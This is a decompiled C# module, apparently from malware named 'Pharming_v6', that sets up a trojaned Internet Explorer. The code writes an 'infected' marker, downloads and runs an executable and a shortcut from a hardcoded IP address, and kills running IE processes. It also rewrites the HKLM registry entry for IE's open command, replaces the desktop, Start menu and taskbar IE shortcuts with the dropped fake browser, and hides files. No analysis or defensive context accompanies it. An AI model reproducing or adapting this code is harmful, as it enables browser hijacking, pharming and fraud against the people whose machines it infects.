using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using Pharming_v6.My;

namespace Pharming_v6;

[StandardModule]
internal sealed class ie
{
	public static void ie()
	{
		string path = Module1.temp + "wingbiso.txt";
		FileStream fileStream = null;
		try
		{
			if (!File.Exists(path))
			{
				fileStream = File.Create(path);
				using (fileStream)
				{
				}
				using StreamWriter streamWriter = new StreamWriter(path);
				streamWriter.Write("infected");
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(Module1.temp + "\\extractie\\ieextract.exe"))
		{
			return;
		}
		string parentPath = ((ServerComputer)MyProject.Computer).get_FileSystem().GetParentPath(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Programs());
		string address = "http://64.250.116.233/ieextract.exe";
		((ServerComputer)MyProject.Computer).get_FileSystem().CreateDirectory(Module1.temp + "\\extractie");
		try
		{
			WebClient webClient = new WebClient();
			webClient.DownloadFile(address, Module1.temp + "\\extractie\\ieextract.exe");
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		string address2 = "http://64.250.116.233/player";
		try
		{
			WebClient webClient2 = new WebClient();
			webClient2.DownloadFile(address2, Module1.temp + "\\extractie\\Internet Explorer.lnk");
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		Process.Start(Module1.temp + "\\extractie\\ieextract.exe");
		try
		{
			Process[] processesByName = Process.GetProcessesByName("iexplore");
			foreach (Process process in processesByName)
			{
				process.Kill();
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
		Thread.Sleep(20000);
		Registry.LocalMachine.OpenSubKey("Software\\Clients\\StartMenuInternet\\IEXPLORE.EXE\\shell\\open\\command\\", writable: true)!.SetValue("", Module1.temp + "extractie\\iexplore.exe");
		if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Desktop() + "\\Internet Explorer.lnk"))
		{
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Desktop() + "\\Internet Explorer.lnk");
			Thread.Sleep(10000);
			((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Module1.temp + "\\extractie\\iexplore.exe", ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Desktop() + "\\Internet Explorer.exe", true);
			Process.Start(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Desktop() + "\\Internet Explorer.exe");
			Thread.Sleep(10000);
			Process[] processesByName2 = Process.GetProcessesByName("Internet Explorer");
			foreach (Process process2 in processesByName2)
			{
				process2.Kill();
			}
			File.SetAttributes(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Desktop() + "\\Portable IE 8 PT-BR [By N1gh7w0lf] - (spbrasil-2009.blogspot.com)", FileAttributes.Hidden);
		}
		else
		{
			Thread.Sleep(10000);
			((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Module1.temp + "\\extractie\\iexplore.exe", ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Desktop() + "\\Internet Explorer.exe", true);
			Process.Start(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Desktop() + "\\Internet Explorer.exe");
			Thread.Sleep(10000);
			Process[] processesByName3 = Process.GetProcessesByName("Internet Explorer");
			foreach (Process process3 in processesByName3)
			{
				process3.Kill();
			}
			File.SetAttributes(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Desktop() + "\\Portable IE 8 PT-BR [By N1gh7w0lf] - (spbrasil-2009.blogspot.com)", FileAttributes.Hidden);
		}
		if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Programs() + "\\Internet Explorer.lnk"))
		{
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Programs() + "\\Internet Explorer.lnk");
		}
		if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(parentPath + "Internet Explorer.lnk"))
		{
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(parentPath + "\\Internet Explorer.lnk");
			Thread.Sleep(10000);
			((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Module1.temp + "\\extractie\\iexplore.exe", parentPath + "\\Internet Explorer.exe", true);
			Process.Start(parentPath + "\\Internet Explorer.exe");
			Thread.Sleep(10000);
			Process[] processesByName4 = Process.GetProcessesByName("Internet Explorer");
			foreach (Process process4 in processesByName4)
			{
				process4.Kill();
			}
			File.SetAttributes(parentPath + "\\Portable IE 8 PT-BR [By N1gh7w0lf] - (spbrasil-2009.blogspot.com)", FileAttributes.Hidden);
		}
		else
		{
			Thread.Sleep(10000);
			((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Module1.temp + "\\extractie\\iexplore.exe", parentPath + "\\Internet Explorer.exe", true);
			Process.Start(parentPath + "\\Internet Explorer.exe");
			Thread.Sleep(10000);
			Process[] processesByName5 = Process.GetProcessesByName("Internet Explorer");
			foreach (Process process5 in processesByName5)
			{
				process5.Kill();
			}
			File.SetAttributes(parentPath + "\\Portable IE 8 PT-BR [By N1gh7w0lf] - (spbrasil-2009.blogspot.com)", FileAttributes.Hidden);
		}
		try
		{
			if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(Module1.appdata + "\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar\\Internet Explorer.lnk"))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Module1.appdata + "\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar\\Internet Explorer.lnk");
				Thread.Sleep(10000);
				((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Module1.temp + "\\extractie\\Internet Explorer.lnk", Module1.appdata + "\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar\\Internet Explorer.lnk", true);
			}
			else
			{
				Thread.Sleep(10000);
				((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Module1.temp + "\\extractie\\Internet Explorer.lnk", Module1.appdata + "\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar\\Internet Explorer.lnk", true);
			}
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
	}
}
